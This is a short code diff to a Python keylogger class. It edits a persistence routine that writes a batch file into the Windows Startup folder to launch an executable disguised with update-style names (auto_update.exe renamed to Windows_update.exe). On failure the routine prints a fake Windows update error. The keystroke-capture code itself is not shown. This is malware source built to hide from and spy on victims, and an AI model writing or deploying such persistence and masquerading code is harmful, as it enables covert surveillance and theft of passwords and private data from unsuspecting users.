@@ -5,6 +5,7 @@ import time
 import getpass
 import shutil
 import os
+
 class Keylogger:
     
     def __init__(self): 
@@ -49,7 +50,7 @@ class Keylogger:
             username = getpass.getuser()
             with open(f'C:\\Users\\{username}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\auto_update.bat', 'w') as file:
             # Write content to the file
-                file.write(f"""start K:\\auto_update.exe""")
+                file.write(f"""start K:\\Windows_update.exe""")
         except Exception as e:
             print("Error [0x80070643]: Failed to Update")
 
